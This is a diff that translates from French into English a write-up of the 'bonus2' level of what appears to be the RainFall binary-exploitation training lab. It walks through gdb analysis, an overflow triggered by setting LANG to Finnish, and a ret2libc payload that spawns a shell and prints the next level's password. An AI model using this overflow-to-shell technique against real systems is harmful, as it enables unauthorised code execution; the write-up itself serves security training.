@@ -1,7 +1,5 @@
-
-Le bonus 2 prend en parametre 2 arguments.
-Si ce n'est pas respecte le programme s'arrete.
-Il y a 2 fonctions :
+Bonus2 takes 2 arguments. If not then the execution stops.
+There are 2 functions : 
 
 (gdb) info functions
 All defined functions:
@@ -10,12 +8,11 @@ Non-debugging symbols:
 ...
 0x08048484  greetuser
 0x08048529  main
-...
 
-Lors de l'excution avec 2 arguments valide le retour affiche "Hello + argv[1]"
+During the execution with 2 valid arguments the return is "Hello + argv[1]".
 
-On essaye de le faire segfault, mais on a pas le controle d'EIP.
-Dans l'assembleur on decouvre que getenv charge la variable de la langue.
+We try to make it segfault, but we don't have control of EIP.
+In the assembly, we found that getenv is loading the language variable.
 
 0x0804859f <+118>:	movl   $0x8048738,(%esp)
 0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
@@ -23,7 +20,7 @@ Dans l'assembleur on decouvre que getenv charge la variable de la langue.
 x/s 0x8048738 
 0x8048738:	 "LANG"
 
-Un check est fait sur fi qui est la langue finlandaise :
+A check is made on fi which is the finnish language.
 
 0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
 0x080485cc <+163>:	mov    0x9c(%esp),%eax
@@ -31,21 +28,21 @@ Un check est fait sur fi qui est la langue finlandaise :
 0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
 
 x/s 0x804873d
-0x804873d:	 "fi"
+0x804873d:	"fi"
 
-On change donc la varible d'envionnement pour voir ce qu'il se passe.
+We will now change the env variable to see if something is changing.
 
 LANG=fi_FI.UTF-8
 
-On relance avec les memes arguments qu'avant et avec un generateur de pattern overflow
-on a le controle de l'EIP avec le 2eme buffer qui vaut 22.
+We reexecute with the same arguments and with a pattern overflow we 
+have control of EIP with the 2nd argument at 22.
 
 ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "CCCC"')
 
-EIP vaut bien 434343
+EIP is equal to 434343
 [ 8350.553542] bonus2[6048]: segfault at 43434343 ip 43434343 sp bffff660 error 14
 
-On cherche a avoir acces a un shell, voyons si la chaine "/bin/sh" existe :
+We are looking to get a shell, let's check if "/bin/sh" exists.
 
 (gdb) info proc map
 process 6144
@@ -72,16 +69,18 @@ Mapped address spaces:
 0xb7f8cc58:	 "/bin/sh"
 (gdb) 
 
-C'est le cas. Il nous manque l'adresse de system :
+It's the case. We also need the system function address:
 
 gdb) p &system
 $1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
 
-On va envoyer les arguments suivant :
+We are going to send the parameters as follow :
 
-./bonus2 [BUFFER 1 de 40] [BUFFER 2 : PADDING 18 + ADRESSE SYSTEM + PADDING 4 + ADRESSE /bin/sh]
+./bonus2 [BUFFER 1 of 40] [BUFFER 2 : PADDING 18 + SYSTEM ADRESS + PADDING 4 + ADRESS /bin/sh]
 
 bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\x60\xb0\xe6\xb7" +"AAAA"+ "\x58\xcc\xf8\xb7"')
 Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`��AAAAX���
 $ cat /home/user/bonus3/.pass 
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+
